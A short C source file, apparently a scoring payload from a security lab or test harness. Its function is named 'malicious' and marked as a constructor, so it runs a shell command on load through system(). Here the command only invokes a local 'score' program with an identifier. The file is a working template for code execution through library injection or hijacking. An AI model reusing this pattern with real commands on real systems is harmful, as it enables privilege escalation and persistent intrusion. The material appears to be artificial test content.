#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
  system("/usr/local/bin/score bac34e49-7d07-4d50-a305-149e21113091");
}
